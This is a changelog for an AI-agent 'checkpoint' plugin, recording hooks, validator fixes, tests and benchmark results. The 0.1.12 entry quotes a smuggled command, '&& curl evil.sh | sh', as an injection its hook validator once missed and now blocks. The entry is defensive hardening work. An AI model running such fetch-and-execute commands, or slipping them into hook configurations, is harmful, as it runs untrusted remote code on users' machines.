# Changelog

## [0.1.12] - 2026-08-22

### Fixed
- `stop-checkpoint.js`: an empty or unparseable stdin (I/O hiccup, timing, or a schema change) fell through to the block branch instead of being treated like `stop_hook_active: true` — the exact failure mode the loop guard exists to prevent. Now fails toward *not* blocking. Found by adversarial review; regression-tested in the new `tests/test_hooks_runtime.py`.
- `scripts/validate_distribution.py`'s `validate_hooks()`: the `${CLAUDE_PLUGIN_ROOT}` path check joined the reference without resolving or enforcing containment, so `../../outside.js` could pass validation whenever a file happened to exist at that escaped path, and content appended after the quoted segment (`&& curl evil.sh | sh`) went unexamined. Both closed: the whole command is now anchored end-to-end (`^<word> "${CLAUDE_PLUGIN_ROOT}/path"$`, nothing else permitted) and the resolved path must stay under the plugin directory. Found independently by 3 review passes (security specialist, Claude adversarial, Codex structured review) — cross-confirmed, not a single-source guess. Two new regression tests.

### Added
- `tests/test_hooks_runtime.py`: the 3 shipped hook scripts had zero behavioral test coverage since 0.1.9 (only the manifest structure was validated, never actually running `node` against them) — closed via subprocess-based tests covering the block/no-block/fail-safe paths for all three hooks.
- `plugins/checkpoint/hooks/lib/read-stdin-json.js`: the stdin-read-and-parse boilerplate was duplicated near-verbatim between `pre-compact-reminder.js` and `stop-checkpoint.js` (maintainability specialist finding) — extracted to one shared helper. Also adds a 64KB stdin size cap (unbounded buffering was a security-specialist finding) and treats non-object parsed JSON as a failed read.
- Named `STDIN_READ_TIMEOUT_MS` constant in both callers, with a comment tying it to the `timeout: 3` (3000ms) budget each hook is given in `hooks.json` — previously a bare `2000` literal duplicated in two files with no link to the process budget it has to stay under (maintainability specialist finding).
- All three hooks now set `process.exitCode` instead of calling `process.exit()` immediately after `process.stdout.write()`, so Node exits only once the write has actually flushed (Claude/Codex adversarial finding: `exit()` can terminate before an async pipe write completes).
- `tests/test_distribution.py`: deduplicated the repeated temp-plugin-directory setup across hook-validator tests into `_write_hooks_manifest()` (maintainability specialist finding).

### Reviewed, not changed
- Codex adversarial claimed (citing an unverifiable "25 probes") that Claude Code's `Stop` hook fires after every assistant turn, not just at genuine stop/pause points — which would make `stop-checkpoint.js`'s design fundamentally broken. Its only two live `exec` attempts during that review were both rejected by its own sandbox, so the "25 probes" figure has no shown evidence behind it. Independent verification against official docs was inconclusive either way. Direct empirical evidence from this repo's own development session (the hook was live across dozens of turns and fired exactly twice, not on every turn) contradicts the claim. Not acted on, but not fully closed either — revisit if the hook is ever observed blocking more often than genuine stop points warrant.
- Codex claimed release-version validation omits the Codex marketplace file's version. Checked: `.agents/plugins/marketplace.json` has no version field at all — nothing to validate there. Claim rested on a false premise.
- Codex claimed the shell-form `${CLAUDE_PLUGIN_ROOT}` command in `hooks.json` (vs. exec-form with `args`) is non-standard/unsafe. Contradicted by real, currently-active third-party plugins on this machine (`context-mode`, `astronomer-data`) using the identical shell-embedded form — not changed.
- Mixed-evidence profile-precedence rule (0.1.10): Codex raised a legitimate design question (deciding solely by `Next action` can drop the other profile's fields when the next action later shifts domains) — a real critique of the rule's stability, not a code bug. No fixture proves or disproves it yet; left as an open design question rather than acted on speculatively.

## [0.1.11] - 2026-08-22

### Added
- `scripts/validate_distribution.py`: `plugins/checkpoint/hooks/hooks.json` is now a required distribution file, plus a new `validate_hooks()` check verifying it's well-formed JSON, every event has a non-empty hook group, and every `command` references `${CLAUDE_PLUGIN_ROOT}` and resolves to a real script under the plugin. `tests/test_distribution.py` gained 3 tests (shipped manifest is valid; catches a missing referenced script; catches a command missing `${CLAUDE_PLUGIN_ROOT}`) — 0.1.9's hook addition had shipped with zero regression coverage until now.
- `.claude/hookify.suggest-checkpoint.local.md`: the Tier 1 `hookify` rule described in `docs/HOOKS.md` since 0.1.7 existed only as documentation, never as a real file anywhere. Added for this repo (gitignored via `.claude/*.local.md`, matching `.local.md`'s own convention) and confirmed it actually loads via hookify's `load_rules()`.
- `$checkpoint:recall` forward-test (`benchmarks/results/2026-08-21/report.md`, "Addendum" section): the skill had zero forward-test coverage before this. Cold-resume comparison (checkpoint-fed vs. raw-log-only baseline) on the `mixed-evidence-profile` fixture: 4 reconstructive questions vs. 10 baseline (60% reduction, consistent with 0.1.0's original 64.3% finding). One honest partial-fail noted and left unresolved: the resume JSON didn't restate the branch name inside its required fields on this run, despite retaining and correctly flagging it elsewhere in the same answer — not patched over, tracked as an open question.

## [0.1.10] - 2026-08-21

### Added
- Profile-precedence rule in `references/profiles.md` and `SKILL.md`'s "Select profile" section: when a task carries evidence for more than one profile, the profile is decided by `Next action`, not by which evidence appeared first or is most abundant. A worked example (research that concludes into implementation → `developer`) is included. Proactive change — no real misclassification was observed; added because the existing rule was silent on the mixed-evidence case.
- `benchmarks/fixtures/mixed-evidence-profile/` fixture and `benchmarks/results/2026-08-21/` forward-test evidence (19/19, fresh agent with no visibility into the expected result correctly chose `developer` on a task that opened with research evidence).

### Known limitation
- The rule's `generic`-fallback branch (`Next action` spanning two kinds of work equally) and other evidence-order permutations (research-after-code, operations-mixed-with-developer) are undocumented by fixture coverage — only the research-then-code shape was forward-tested this release.

## [0.1.9] - 2026-08-21

### Added
- Shipped the Tier 2 native hooks described in `docs/HOOKS.md`: `plugins/checkpoint/hooks/hooks.json` wires `PreCompact` (matcher `manual|auto`), `SessionStart` (matcher `compact`), and `Stop`. Each is message-only — `PreCompact` and `SessionStart` write a plain reminder / `additionalContext` pointing at `$checkpoint:save --trigger ...`; `Stop` uses `decision: "block"` with a `stop_hook_active` guard to force (not just nudge) one more turn before the session actually ends, since `PreCompact` cannot block (platform limitation) but `Stop` can. None of the three ever writes a checkpoint file itself.

### Changed
- Reverses the prior "the plugin itself ships no hook" stance in `docs/HOOKS.md`. Threat review for this exception: the plugin is personal-scope, not published to a public marketplace; the two hooks capable of acting (`SessionStart`, `Stop`) only ever emit a reminder or a block reason — no filesystem write, no network access, no autonomous save. Accepted knowingly as a documented exception to the `docs/DISTRIBUTION.md` "no hooks unless documented need + threat review" bar, scoped to this personal install.

## [0.1.8] - 2026-08-11

### Changed
- Project-scope `.gitignore` handling no longer touches the project's own root `.gitignore`. Instead, on first creation of `.checkpoint/`, the skill writes a self-contained `.checkpoint/.gitignore` (single `*` line) so the directory excludes itself from git. Removes the "ask before creating a root `.gitignore`" edge case entirely, since nothing outside `.checkpoint/` is written anymore. Updated `references/scope-and-role.md` and `assets/scope-config-template.md` accordingly.

## [0.1.7] - 2026-08-07

### Added
- `scope` (`project` default, or `global`) and `role` (free text) resolution, specified in the new `references/scope-and-role.md`: an explicit `--scope`/`--role` flag on `save` overrides and persists the value for the current project; otherwise a previously recorded value is reused silently; otherwise the agent asks once. No new command — `save` doubles as first-run init.
- `.checkpoint/config.md` project-local marker (`assets/scope-config-template.md`) and a global config keyed by project path for `global` scope. Project scope appends `.checkpoint/` to `.gitignore` when creating it, and never overwrites an existing `.gitignore`.
- `--trigger manual|post-commit|post-push|stop|pre-compact` flag on `save`, defaulting to `manual`, recording why an automated checkpoint fired.
- `--scope` filtering flag on `list` and `recall`.
- `docs/HOOKS.md`: documented, threat-reviewed guidance for wiring auto-checkpoint triggers — a Tier 1 `hookify` message-only rule for post-commit/post-push nudges (preferred, no new permission surface), and a Tier 2 native `Stop`/`PreCompact` hook shortlist for when a passive reminder isn't enough. No hook ships enabled by default; both tiers only ever lead to an explicit `save` invocation, never an autonomous write.
- `scope` and `role` fields added to the canonical checkpoint frontmatter template.
- Soft, non-blocking verbosity check in `checkpoint_contract.py` (`verbosity_warnings` on `ValidationResult`): flags total body or any single section over a word-count ceiling without failing the contract, giving the existing "scannable in under one minute" instruction something a benchmark run can actually catch.

### Fixed
- First-run scope/role resolution no longer blocks writing the checkpoint. A fresh-agent forward test (`benchmarks/results/2026-08-07/`) caught the original wording asking its one-time scope/role question *instead of* rendering the checkpoint on explicit `$checkpoint:save` invocation — contract score 1/18. Corrected wording in `references/scope-and-role.md` and `save/SKILL.md` writes the checkpoint immediately with defaults (`scope: project`, `role: Unknown`) and asks the question alongside it, not in place of it — re-tested at 18/18 on an independently fresh agent.

### Known limitation
- The scope=`global` and role≠`Unknown` first-run paths, `list`/`recall` `--scope` filtering, and the real Codex app-server protocol were not forward-tested this release — only `save`'s all-defaults first-run path was exercised end-to-end via an isolated text-generation agent. See "Limitations and next proof" in `benchmarks/results/2026-08-07/report.md`.

## [0.1.6] - 2026-08-04

### Changed
- Generated checkpoint documents now follow the user's current language unless another language is explicitly requested.
- Technical identifiers, paths, commands, branch names, and error messages remain verbatim across localized checkpoint output.

## [0.1.5] - 2026-08-04

### Added
- Reproducible developer setup with `PyYAML` declared as an optional development dependency.
- Setup guidance explaining that `PyYAML` supports official manifest validation and is not required at plugin runtime.

## [0.1.4] - 2026-08-04

### Added
- Codex-native `$checkpoint:save`, `$checkpoint:list`, and `$checkpoint:recall` adapter skills.
- Distribution validation for plugin-directory namespace alignment and all four Codex skills.

### Changed
- Renamed the installable plugin root to `plugins/checkpoint/` so Codex package and manifest names match.
- Updated Codex and Claude marketplace installation identifiers to `checkpoint` while preserving Claude slash commands.

### Verified
- Seventeen deterministic tests pass.
- Codex plugin validation, all four skill validations, and Claude strict plugin/marketplace validation pass.
- Codex local marketplace installation is enabled and the installed cache contains all four namespaced skills.

### Known limitation
- The current local Codex app-server ignored structured `type: skill` items during forward smoke probes, including the canonical control. Run the behavioral trigger test in a fresh Codex task after installation; do not treat this release's static setup verification as behavioral proof.

## [0.1.1] - 2026-08-02

### Added
- Real Codex app-server smoke harness that invokes the skill with a `type: skill` input item.
- Release instructions for pairing host smoke output with the deterministic checkpoint evaluator.

### Fixed
- Developer checkpoints now preserve searchable `Do not:` boundaries and explicitly record unknown changed-file state.
- Profile selection now treats repository, branch, source, test and migration evidence as developer context.
- Host smoke testing no longer mistakes a plain `$checkpoint` text token for an attached Codex skill invocation.

### Verified
- Real app-server skill invocation passes the developer contract at 19/19.
- Fifteen deterministic regression tests pass.

## [0.1.0] - 2026-08-02

### Added
- Portable `checkpoint` skill with generic, developer, research, and operations profiles.
- Codex and Claude Code plugin manifests and local marketplace catalogs.
- Deterministic checkpoint, cold-resume, distribution, version, path, and privacy validation.
- Fourteen regression tests plus isolated-agent creator, resume, and baseline fixtures.
- CI across Python 3.11, 3.12, and 3.13.
- MIT license, contribution contract, distribution guide, and reference-implementation audit.

### Verified
- Official skill-creator validation passes.
- Codex plugin-creator and Claude strict manifest validation pass.
- Contract scores: developer 19/19, research 18/18, operations 20/20.
- Cold-resume reconstructive questions: 5 total versus 14 from raw-state baselines.
- Codex and Claude user-scope marketplace installation succeeds at version `0.1.0`.
- Isolated Codex behavior test passes the developer checkpoint contract at 19/19.

### Fixed
- Explicit `$checkpoint` and `/checkpoint` invocation now requires the full canonical template, including chat-only output.
